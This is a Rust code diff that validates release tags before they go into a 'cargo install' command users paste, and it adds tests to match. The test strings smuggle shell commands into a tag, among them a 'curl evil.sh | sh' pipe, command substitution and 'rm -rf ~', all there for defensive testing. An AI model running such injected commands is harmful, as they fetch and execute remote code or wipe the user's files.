@@ -26,7 +26,23 @@ pub fn tag_from_location(location: &str) -> Option<String> {
     if tag.is_empty() || tag.contains('/') {
         return None;
     }
+    if !is_valid_tag(tag) {
+        return None;
+    }
     Some(tag.to_string())
+}
+
+/// Release tags arrive from the network and one of them ends up inside a shell
+/// command we ask the user to paste. Accept only what our own releases look
+/// like; anything else is treated as "no release found" rather than sanitised,
+/// because a tag we do not recognise is not one we could act on anyway.
+pub fn is_valid_tag(tag: &str) -> bool {
+    !tag.is_empty()
+        && tag.len() <= 64
+        && tag.starts_with(|c: char| c.is_ascii_alphanumeric())
+        && tag
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '_' | '-'))
 }
 
 /// Fetch the newest release tag. Not unit-tested on purpose: it is the thin
@@ -42,6 +58,7 @@ pub fn fetch_latest_tag(url: &str) -> anyhow::Result<String> {
         // the 3xx response itself so we can read its Location header.
         .max_redirects(0)
         .max_redirects_will_error(false)
+        .https_only(true)
         .build()
         .into();
     let response = agent
@@ -108,6 +125,29 @@ mod tests {
         );
         assert_eq!(
             tag_from_location("https://github.com/o/r/releases/tag/a/b"),
+            None
+        );
+    }
+
+    #[test]
+    fn a_tag_carrying_shell_metacharacters_is_refused() {
+        // This tag reaches a `cargo install ... --tag {tag}` string that the
+        // popup shows the user to paste into a shell, so the parser is the
+        // place to stop it.
+        assert_eq!(
+            tag_from_location("https://github.com/o/r/releases/tag/v9.9.9+; curl evil.sh | sh"),
+            None
+        );
+        assert_eq!(
+            tag_from_location("https://github.com/o/r/releases/tag/v1.0.0`id`"),
+            None
+        );
+        assert_eq!(
+            tag_from_location("https://github.com/o/r/releases/tag/v1.0.0$(id)"),
+            None
+        );
+        assert_eq!(
+            tag_from_location("https://github.com/o/r/releases/tag/v1.0.0 rm -rf ~"),
             None
         );
     }
